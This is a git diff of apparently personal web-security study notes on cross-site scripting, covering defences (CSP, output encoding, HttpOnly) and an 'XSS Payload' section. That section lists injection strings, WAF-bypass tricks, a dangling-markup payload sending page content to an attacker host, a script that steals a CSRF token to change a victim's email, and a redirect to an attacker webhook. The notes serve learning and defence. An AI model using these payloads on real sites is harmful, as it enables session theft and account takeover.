@@ -1,18 +1,53 @@
-
-XSS
+How to prevent XSS:
 
 To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use 
 the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
 Use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still can occur. 
 
-Content-Type explaination: 
- XSS only applies to documents that are capable of running active script content in the first place.
+-Use a CSP like:
+Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
+CSP often block script resources, but allow img element to make requests.
+CSP protect also from clickjacking.
+
+-Content-Type explaination: 
+XSS only applies to documents that are capable of running active script content in the first place.
 
 A page with the MIME type application/json can't contain active content. To the browser it's just data. The situation would be similar with text/plain, 
 text/javascript, image/jpeg, etc.
 
 XSS would be possible with a MIME type of e.g. text/html, image/svg+xml, text/xml and many others. In some cases, vendor-related types such as 
 application/x-shockwave-flash may have an XSS potential, too.
+
+-Encode Output Data and validate input:
+
+In an HTML context, you should convert non-whitelisted values into HTML entities:
+
+    < converts to: &lt;
+    > converts to: &gt;
+
+In a JavaScript string context, non-alphanumeric values should be Unicode-escaped:
+
+    < converts to: \u003c
+    > converts to: \u003e
+
+If a user can supply Javascript on the URL, validate the input to be sure that it use a safe protocol.
+They can use harmful protocol like javascript and data.
+
+Don't try to do a blacklist, do a whitelist.
+
+-Use a template engine:
+
+There are some server side template engine that defines they're own way to escape. Ex:
+{{ user.firstname | e('html') }}
+
+-How to prevent XSS in php:
+
+In php you can use htmlentities to escape your input in HTML context.
+In javascript context you need to implement your own Unicode-escape.
+
+-How to prevent XSS in jQuery:
+Use jsEscape if you pass untrusted data to the jQuery Selector $('#Input')
+
 
 -----------------------CSP
 CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a 
@@ -22,22 +57,22 @@ of one or more directives, separated by semicolons.
 
 script-src 'self'
 
-The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script 
-will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable.
+The CSP directive can specify a random value and the same value must be used in the tag that loads a script. If the values do not match, then the script 
+will not execute.
 
 The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, 
-then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.
+then the script will not execute.
 
--------HttpOnly
+-----------------------HttpOnly
 Set-Cookie: sessionid=QmFieWxvbiA1; HttpOnly
 
 Many applications hide their cookies from JavaScript using the HttpOnly flag. 
 HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate 
 the risk of client side script accessing the protected cookie (if the browser supports it).
-If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script 
+If the HttpOnly flag is included in the HTTP response header, the cookie cannot be accessed through client side script 
 (if the browser supports this flag)
 
------Dangling markup injection
+----------------------Dangling markup injection
 
 Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
 
@@ -48,18 +83,17 @@ In this situation, an attacker would naturally attempt to perform XSS. But suppo
 content security policy, or other obstacles. Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:
 "><img src='//attacker-website.com?
 
-This payload creates an img tag and defines the start of a src attribute containing a URL on the attacker's server. Note that the attacker's payload doesn't close
-the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the 
-attribute. Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. 
+Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, 
+it will look ahead until it encounters a single quotation mark toterminate the attribute. 
+Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. 
 Any non-alphanumeric characters, including newlines, will be URL-encoded.
 
 The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. 
 Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.
 
 Any attribute that makes an external request can be used for dangling markup. 
-It is also useful if some secret is saved in clear text in the HTML and you want to exfiltrate it from the client, or if you want to mislead some script execution.
 
-------------------------------------DOM XSS, what is the DOM?
+------------------------------------What is the DOM?
 
 DOM is a programming interface for web documents. It represent the page as nodes and objects.
 DOM can be manipulated with javascript, for example document.querySelectorAll('p') select all <p> att
@@ -68,44 +102,55 @@ The DOM is built using multiple APIs that work together. The core DOM defines th
 For example, the HTML DOM API adds support for representing HTML documents to the core DOM, and the SVG API adds support for representing SVG documents. 
 Implementations of the DOM can be built for any language.
 When you create a script, whether inline in a <script> element or included in the web page, you can immediately begin using the API for the document or window
-objects to manipulate the document itself
+objects to manipulate the document itself.
 
 -----------------------------------XSS Payload
 
-Remember that you can execute JS in Href att. with: javascript:alert(1) (jQuery)
+-You can execute JS in href att. with("javascript:" is a protocol): javascript:alert(1)
 
-Try to use - alert() - or + alert() + for strings OR tru to use ; alert() ; to inject xss on Javascript code
+-Try to use - print() - or + print() + for strings OR try to use ; alert() ; to inject XSS on Javascript.
 
-Ex:  <script>
-            var searchTerms = 'dcsdc'; alert(1) ; var myvar = '1';
+Result:  
+    <script>
+            var searchTerms = 'something'; alert(1) ; var myvar = '1';
             document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
     </script>
 
-    payload = dcsdc'; alert(1) ; var myvar = '1    (XSS Injected on JS)
 
+-AngularJS and regular js. Try to insert {{ 1 + 1 }}, if the input is evalueted and you receive 2 ther is a XSS vuln. 
+Then you can try to use : {{constructor.constructor('print()')()}}
 
-AngularJS and regular js. Try to insert {{ 1 + 1 }}, if the input is evalueted and you receive 2 ther is a XSS vuln. ---> {{constructor.constructor('alert(1)')()}}
+-If you know that the user is gonna press a key you can use:
+  ?accesskey = x onclick = print() (only chrome)
 
-If you know that the user is gonna press a key you can use ?accesskey = x onclick = alert(1) (only chrome)
+-For brek out from JS string / JSON try:
+\'-alert(1)// (when < and " are blacklisted but not \) because \ is used to escape special characters in JS)
+You can also try \';alert(1)//   (the \ is for the escape of ' . Because sometimes ' = '\' so with \'  you got =  \\';yourcode//'. With two backslash the second \ is now interpreted literally)
+(Any syntax errors there will prevent the whole script from executing)
 
-
-For brek out from JS string / JSON try  \'-alert(1)// (when < and " are blacklisted but not \) bc \ is used to escape special characters in JS
-
-you can also try \';alert(1)//   the \ is for the escape of ' . Because sometimes ' = '\' so with \'  you got =  '\\';yourcode//'
-
-
---------------CSRF using XSS: 
+-CSRF using XSS: 
 <script>
 var req = new XMLHttpRequest();//It depends on the api, you can try with fetch()
 req.onload = handleResponse;
-req.open('get','/my-account',true);
+req.open('get','/data',true);
 req.send();
 function handleResponse() {
     var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; //take the users CSRF token
     var changeReq = new XMLHttpRequest();
-    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.open('post', '/data/form', true);
     changeReq.send('csrf='+token+'&email=test@test.com') //Append CSRF token and change email
 };
 </script>
 
+-Custom script inject(if there is no CSP)
+<script>
+location = 'https://attacker_webhook?%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
 
+-You can try to bypass html escape with the svg element.(That defines vector-based graphics)
+
+-If the web application firewall prevents your requests from ever reaching the website, you can try to throw an exception:
+onerror=alert;throw 1
+
+-When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further.
+You can try to bypass input validation HTML encoding the special carachters. &apos; will be converted to " and you will bypass the validation. 
